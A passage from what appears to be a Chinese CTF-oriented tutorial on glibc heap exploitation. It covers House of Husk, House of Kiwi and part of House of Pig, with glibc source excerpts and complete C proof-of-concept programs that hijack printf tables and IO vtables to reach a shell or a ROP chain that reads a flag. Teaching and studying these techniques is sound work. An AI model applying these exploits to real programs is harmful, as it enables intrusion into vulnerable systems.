<code>X</code>）注册对应的函数。而维护字符与函数的映射关系的结构有
<code>__printf_function_table</code> 和
<code>__printf_arginfo_table</code>
。位置关系如下图所示（实际位置在哪里以及相对位置如何不重要，glibc 只通过
<code>__printf_function_table</code> 和
<code>__printf_arginfo_table</code> 这两个指针访问这两个函数表），其中有
2 字节填充。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/edf77a3058ba82a89a35304d8491a08c.png"
                      alt="在这里插入图片描述" style="zoom: 67%;" 
                ></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">			     printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line">	<span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  result = <span class="number">-1</span>;</span><br><span class="line">	  <span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">	(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_function (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">			    printf_arginfo_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __register_printf_specifier (spec, converter,</span><br><span class="line">				      (printf_arginfo_size_function*) arginfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>printf</code> 实际在 glibc 中为 <code>__printf</code>
，它调用的是 <code>vfprintf</code> 。在 <code>vfprintf</code>
函数中，如果 <code>__printf_function_table</code> 不为空，那么会调用
<code>printf_positional</code> 函数。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">vfprintf</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, va_list ap)</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line">	...</span><br><span class="line">	do_positional:</span><br><span class="line">	...</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 在
<code>printf_positional</code> 及其调用的
<code>__parse_one_specmb</code>
函数中，<code>__printf_function_table</code> 和
<code>__printf_arginfo_table</code> 中的函数都会被调用，因此可以将
<code>__printf_function_table</code> 或者
<code>__printf_function_table</code> 指针覆盖为伪造的
<code>__printf_function_table</code> 和
<code>__printf_arginfo_table</code> 并在其中写入 one_gadget 来获取 shell
。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__parse_one_specmb (<span class="type">const</span> UCHAR_T *format, <span class="type">size_t</span> posn,</span><br><span class="line">		    <span class="keyword">struct</span> printf_spec *spec, <span class="type">size_t</span> *max_ref_arg)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">      || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">      || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">      <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">	 uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">	 the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">      || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">				   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">				    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">printf_positional</span> <span class="params">(_IO_FILE *s, <span class="type">const</span> CHAR_T *format, <span class="type">int</span> readonly_format,</span></span><br><span class="line"><span class="params">		   va_list ap, va_list *ap_savep, <span class="type">int</span> done, <span class="type">int</span> nspecs_done,</span></span><br><span class="line"><span class="params">		   <span class="type">const</span> UCHAR_T *lead_str_end,</span></span><br><span class="line"><span class="params">		   CHAR_T *work_buffer, <span class="type">int</span> save_errno,</span></span><br><span class="line"><span class="params">		   <span class="type">const</span> <span class="type">char</span> *grouping, THOUSANDS_SEP_T thousands_sep)</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">      nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line">	...</span><br><span class="line">	  <span class="keyword">if</span> (spec &lt;= UCHAR_MAX</span><br><span class="line">	      &amp;&amp; __printf_function_table != <span class="literal">NULL</span></span><br><span class="line">	      &amp;&amp; __printf_function_table[(<span class="type">size_t</span>) spec] != <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">const</span> <span class="type">void</span> **ptr = alloca (specs[nspecs_done].ndata_args</span><br><span class="line">					 * <span class="keyword">sizeof</span> (<span class="type">const</span> <span class="type">void</span> *));</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Fill in an array of pointers to the argument values.  */</span></span><br><span class="line">	      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; specs[nspecs_done].ndata_args;</span><br><span class="line">		   ++i)</span><br><span class="line">		ptr[i] = &amp;args_value[specs[nspecs_done].data_arg + i];</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Call the function.  */</span></span><br><span class="line">	      function_done = __printf_function_table[(<span class="type">size_t</span>) spec]</span><br><span class="line">		(s, &amp;specs[nspecs_done].info, ptr);</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (function_done != <span class="number">-2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="comment">/* If an error occurred we don&#x27;t have information</span></span><br><span class="line"><span class="comment">		     about # of chars.  */</span></span><br><span class="line">		  <span class="keyword">if</span> (function_done &lt; <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="comment">/* Function has set errno.  */</span></span><br><span class="line">		      done = <span class="number">-1</span>;</span><br><span class="line">		      <span class="keyword">goto</span> all_done;</span><br><span class="line">		    &#125;</span><br><span class="line"></span><br><span class="line">		  done_add (function_done);</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>下面介绍一下 hous of husk 的具体利用手法，具体见细节见 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_husk" >Poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。
1. 首先释放一个 chunk 进入 unsorted bin 泄露 libc 基地址。 2. 构造
unsorted bin attack 修改 <code>global_max_fast</code> 为一个很大的值。
3. 由于 <code>global_max_fast</code> 是一个很大的值，因此即使释放很大的
chunk 也会进入 fast bin ，并且由于下标超过了 bin 数组的范围，因此可以将
<code>__printf_function_table</code> 和
<code>__printf_arginfo_table</code>
覆盖成释放的堆块的内存的指针。利用这一特性可以满足下面的条件： -
为了通过 <code>vfprintf</code> 处的函数判断使函数调用
<code>printf_positional</code> ，可以将
<code>__printf_function_table</code> 覆盖为非 0 值。 - 将
<code>__printf_function_table</code> 或者
<code>__printf_arginfo_table</code> 覆盖为指向写有 one_gadget
的内存的指针。其中 <code>one_gadget</code>
在内存中的偏移对应与之后触发漏洞的 <code>spec</code> 。 - 如果是利用
<code>__printf_function_table</code> 触发漏洞需要让
<code>__printf_arginfo_table</code> 指向一块内存并且该内存对应
<code>spec</code> 偏移处设为 null ，否则会在
<code>__parse_one_specmb</code> 函数的 if 判断中造成不可预知的错误。</p>
<ol start="4" type="1">
<li>最后调用 <code>printf</code> 触发漏洞获取 shell 。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9b8515a4b1953a79a2fec81c9123eb2e.png"
                     
alt="在这里插入图片描述" 
                > poc 如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA       0x3afc40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_MAX_FAST  0x3b1940</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_FUNCTABLE 0x3b4658</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_ARGINFO   0x3b0870</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONE_GADGET       0xdeed2</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> libc_base;</span><br><span class="line">  <span class="type">char</span> *a[<span class="number">10</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>); <span class="comment">// make printf quiet</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* leak libc */</span></span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* UAF chunk */</span></span><br><span class="line">  a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* avoid consolidation */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">  libc_base = *(<span class="type">unsigned</span> <span class="type">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lxn&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* prepare fake printf arginfo table */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line">  <span class="comment">//*(unsigned long*)(a[1] + (&#x27;X&#x27; - 2) * 8) = libc_base + ONE_GADGET;</span></span><br><span class="line">    <span class="comment">//now __printf_arginfo_table[&#x27;X&#x27;] = one_gadget;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* unsorted bin attack */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* overwrite global_max_fast */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* overwrite __printf_arginfo_table and __printf_function_table */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">1</span>]);<span class="comment">// __printf_function_table =&gt; a heap_addr which is not NULL</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">2</span>]);<span class="comment">//__printf_arginfo_table =&gt; one_gadget</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ignite! */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="house-of-kiwi">House of Kiwi</h2>
<p>当程序正常调用 <code>exit</code> 退出时可以通过劫持
<code>vtable</code> 上的 <code>_IO_overflow</code>
来实现程序流劫持，例如 FSOP 。然而，如果程序调用 <code>_exit</code>
退出，那么将不会进行 IO
相关的清理工作，而是直接进行系统调用。因此需要主动触发异常退出来调用
<code>vtable</code> 上的相关函数，这就衍生出了 House of Kiwi
这一攻击手法。</p>
<p>在 <code>sysmalloc</code> 中，有一个检查 top chunk 页对齐的代码片段：
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure></div> 通过调试可知，如果满足条件会调用
<code>__malloc_assert</code> ，而 <code>__malloc_assert</code> 会调用
<code>fflush (stderr);</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 而 <code>fflush</code>
最终会调用 <code>_IO_fflush</code> ，其中
<code>result = _IO_SYNC (fp) ? EOF : 0;</code>
这行代码对应汇编如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/39187563c35d7122ff76a13a3385beed.png"
                     
alt="在这里插入图片描述" 
                > 其中 rbp 指向 <code>_IO_file_jumps_</code>
，因此 <code>call [rbp + 0x60]</code> 调用的是
<code>_IO_new_file_sync</code> ，并且 <code>_IO_file_jumps_</code>
可写。因此只需要将 <code>_IO_file_jumps_</code> 对应
<code>_IO_new_file_sync</code> 函数指针的位置覆盖为 one_gadget
就可以获取 shell 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1dd95a4866c19726c0030b5d916885c6.png"
                     
alt="在这里插入图片描述" 
                > <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/978037c3d39cd3aa46667a9482a3f9d3.png"
                     
alt="在这里插入图片描述" 
                > 不过如果对于禁用 <code>execve</code>
的程序需要借助 <code>setcontext+61</code> + rop 或 shellcode 进行 orw 。
其中 <code>setcontext+61</code> 汇编如下： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000050C0D mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:0000000000050C14 mov     rbx, [rdx+80h]</span><br><span class="line">.text:0000000000050C1B mov     rbp, [rdx+78h]</span><br><span class="line">.text:0000000000050C1F mov     r12, [rdx+48h]</span><br><span class="line">.text:0000000000050C23 mov     r13, [rdx+50h]</span><br><span class="line">.text:0000000000050C27 mov     r14, [rdx+58h]</span><br><span class="line">.text:0000000000050C2B mov     r15, [rdx+60h]</span><br><span class="line">.text:0000000000050C2F test    dword ptr fs:48h, 2</span><br><span class="line">.text:0000000000050C3B jz      loc_50CF6</span><br><span class="line">...</span><br><span class="line">.text:0000000000050CF6 loc_50CF6:                              ; CODE XREF: setcontext+6B↑j</span><br><span class="line">.text:0000000000050CF6 mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:0000000000050CFD push    rcx</span><br><span class="line">.text:0000000000050CFE mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000050D02 mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000050D06 mov     rcx, [rdx+98h]</span><br><span class="line">.text:0000000000050D0D mov     r8, [rdx+28h]</span><br><span class="line">.text:0000000000050D11 mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000050D15 mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000050D15 ; &#125; // starts at 50BD0</span><br><span class="line">.text:0000000000050D1C ; __unwind &#123;</span><br><span class="line">.text:0000000000050D1C xor     eax, eax</span><br><span class="line">.text:0000000000050D1E retn</span><br></pre></td></tr></table></figure></div>
可以看到，寄存器都是根据 rdx
指向的内存区域进行设置的，而根据前面的调试可知，调用
<code>_IO_new_file_sync</code> 时 rdx 指向的是
<code>_IO_helper_jumps_</code> 结构（注意，内存中有不止一个
<code>_IO_helper_jumps_</code>
，具体是哪一个要通过调试确定。），该结构同样可写。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/60bb92dc6cddf372e7022318692210a0.png"
                     
alt="在这里插入图片描述" 
                > 因此可以通过修改
<code>_IO_helper_jumps_</code> 中的内容来给寄存器赋值。 以 rop
方法为例，需要设置 rsp 指向提前布置号的 rop 的起始位置，同时设置 rip
指向 <code>ret</code> 指令。最后劫持程序流实现 orw 。</p>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_kiwi" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_ret libc_base + 0x2da82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdx_r12 libc_base + 0x107191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rsi_ret libc_base + 0x37bba</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rax_ret libc_base + 0x446d0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_ret libc_base + 0x88236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret pop_rdi_ret+1</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> libc_base;</span><br><span class="line"><span class="type">size_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">char</span> FLAG[] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line"></span><br><span class="line">    libc_base  = ((<span class="type">size_t</span>)setvbuf) - <span class="number">0x7a4e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x50bd0</span> + <span class="number">61</span>; <span class="comment">// setcontext + 61</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_helper_jumps = libc_base + <span class="number">0x1f3980</span>; <span class="comment">// _IO_helper_jumps</span></span><br><span class="line">  </span><br><span class="line">    <span class="type">size_t</span> _IO_file_sync = libc_base + <span class="number">0x1f45e0</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rax_ret;</span><br><span class="line">    ROP[i++] = <span class="number">2</span>;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)FLAG;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = syscall_ret;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">3</span>;</span><br><span class="line">    ROP[i++] = pop_rdx_r12;</span><br><span class="line">    ROP[i++] = <span class="number">0x100</span>;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)(FLAG + <span class="number">0x10</span>);</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)read;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">1</span>;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)write;</span><br><span class="line"></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_helper_jumps + <span class="number">0xA0</span>/<span class="number">8</span>) = (<span class="type">size_t</span>)ROP; <span class="comment">// 设置rsp</span></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_helper_jumps + <span class="number">0xA8</span>/<span class="number">8</span>) = ret; <span class="comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span></span><br><span class="line"> </span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_file_sync) = magic_gadget; <span class="comment">// 设置fflush(stderr)中调用的指令地址</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>; <span class="comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发assert</span></span><br><span class="line"></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 实际上 <code>__malloc_assert</code> 函数中在
<code>fflush</code> 前调用的 <code>__fxprintf</code> 中也调用了 vtable
中的相关函数，不过由于此时的 rdx 指向没有指向可控内存，还需要一个 rdi 转
rdx 的 gadget 。后面的 house of emma 就是利用了这条攻击链。</p>
<p>glibc-2.36 的 <code>__malloc_assert</code>
发生重大改变，直接通过系统调用不走 IO，该方法失效。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">_Noreturn</span> <span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  __libc_message (do_abort, <span class="string">&quot;\</span></span><br><span class="line"><span class="string">Fatal glibc error: malloc assertion failure in %s: %s\n&quot;</span>,</span><br><span class="line">		  function, assertion);</span><br><span class="line">  __builtin_unreachable ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3279bc7caeba02a85f8abfb52a8435df.png"
                     
alt="在这里插入图片描述" 
                > ## House of Pig xctf final <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house%20of%20pig" >同名题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，题目条件太多这里只讲思路。
tcache stash unlink 可以实现任意地址申请内存，但是这种方法的前提是同时有
calloc 和 malloc 两种申请内存的方式。对于只能 calloc
申请内存的题目，还需要结合 large bin attack 手法劫持
<code>_IO_list_all</code> 然后伪造 IO_FILE 结构体从而劫持
<code>vtable</code> 到 <code>_IO_str_jumps</code>
上，进而在程序退出时利用 <code>_IO_str_overflow</code> 的
<code>malloc</code> 完成 tcache stash unlink 攻击，利用
<code>memcpy</code> 在 <code>__free_hook</code> 写入 <code>system</code>
函数地址，利用 <code>free</code> 获取 shell 。</p>
<p>首先利用 1 次 UAF 修改 small bin 中 chunk 的 bk 指针使其指向
<code>__free_hook - 0x20</code>，然后利用 large bin attack 修改
<code>__free_hook</code> 所在 fake chunk 的 bk 指针指向 large bin 中的
chunk ，从而 tcache stash unlink 的触发条件。 除此之外，还要再次利用
large bin attack 修改 <code>_IO_list_all</code> 指向 large bin 中的
chunk 。为后面劫持 IO_FILE 做准备。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/5d679c89682963d46efd9ce65e9ade29.png"
                     
alt="在这里插入图片描述" 
                > 通过 calloc 触发 stash 将
<code>__free_hook</code> 所在 fake chunk 链入 tcache 。之后再将
<code>_IO_list_all</code> 指向的 chunk 申请出来，并在里面伪造 IO_FILE
结构体。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/53378ee630a5729d6db2e82e939207c2.png"
                     
alt="在这里插入图片描述" 
                > 函数在退出时会调用
